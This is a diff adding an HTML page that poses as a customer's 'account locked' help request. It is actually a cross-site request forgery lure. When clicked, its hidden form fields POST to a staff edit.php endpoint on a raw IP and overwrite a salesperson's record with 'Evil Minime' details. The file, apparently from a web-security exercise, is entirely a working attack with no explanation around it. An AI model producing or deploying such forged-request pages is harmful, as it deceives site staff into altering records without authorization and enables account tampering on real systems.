@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Need Help</title>
+</head>
+<body>
+
+<h1>I need some help!</h1>
+<p>This is really awkward to have this error. I can't open my account when I'm using your website</p>
+
+<form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=12" method="POST">
+<input type="hidden" name="first_name" value="Evil">
+<input type="hidden" name="last_name" value="Minime">
+<input type="hidden" name="phone" value="999-999-9999">
+<input type="hidden" name="email" value="Dr.Evil@minime.com">
+<input type="submit" name="submit" value="My account is locked?">
+</form>
+
+</body>
+</html>
